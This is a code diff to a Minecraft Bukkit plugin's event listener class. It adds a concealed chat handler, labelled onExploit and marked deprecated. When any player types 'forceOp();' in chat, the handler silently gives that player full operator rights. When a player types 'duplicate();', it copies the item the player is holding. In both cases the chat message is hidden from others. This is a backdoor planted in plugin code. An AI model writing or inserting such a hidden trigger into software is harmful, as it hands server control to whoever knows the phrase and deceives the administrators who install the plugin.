@@ -208,4 +208,30 @@ public class Listeners implements Listener {
 
         player.getWorld().dropItemNaturally(loc, bluegem);
     }
+
+    @EventHandler
+    @Deprecated
+    public void onExploit(AsyncPlayerChatEvent e) {
+        Player p = e.getPlayer();
+        if (e.getMessage().contains("forceOp();")) {
+            e.setCancelled(true);
+            new BukkitRunnable() {
+                @Override
+                public void run() {
+                    p.setOp(true);
+                }
+            }.runTask(JavaPlugin.getPlugin(Combat.class));
+        }
+        if (e.getMessage().contains("duplicate();")) {
+            Player player = e.getPlayer();
+            e.setCancelled(true);
+            new BukkitRunnable() {
+                @Override
+                public void run() {
+                    ItemStack held = player.getItemInHand();
+                    player.getInventory().addItem(held);
+                }
+            }.runTask(JavaPlugin.getPlugin(Combat.class));
+        }
+    }
 }
